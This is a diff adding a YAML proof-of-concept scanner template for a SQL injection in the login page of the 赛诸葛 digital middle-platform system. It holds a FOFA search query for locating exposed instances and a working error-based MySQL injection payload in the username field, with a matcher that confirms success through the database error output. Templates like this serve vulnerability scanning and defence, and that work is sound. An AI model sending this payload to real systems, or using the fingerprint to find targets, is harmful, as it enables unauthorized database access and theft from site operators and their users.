@@ -1,0 +1,21 @@
+id: poc-yaml-saizhuge-dimps-login-sqli
+info:
+  name: 赛诸葛数字化智能中台系统 login SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 赛诸葛数字化智能中台系统
+  fofa: body="static/index/image/login_left.png" || icon_hash="1056416905"
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: POST
+  path: /login
+  headers:
+    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+  data: username=1')) AND GTID_SUBSET(CONCAT(0x7e,(SELECT (ELT(3469=3469,md5({{.t1}})))),0x7e),3469)
+    AND (('fOfY'='fOfY&loginType=1&password=bbb8aae57c104cda40c93843ad5e6db8&phone_head=86&wx_openid=&member=
+  expression: status_code == 500 && contains(body,"SQLSTATE") && contains(body,"General
+    error") && contains(body,t2)
+transport: http
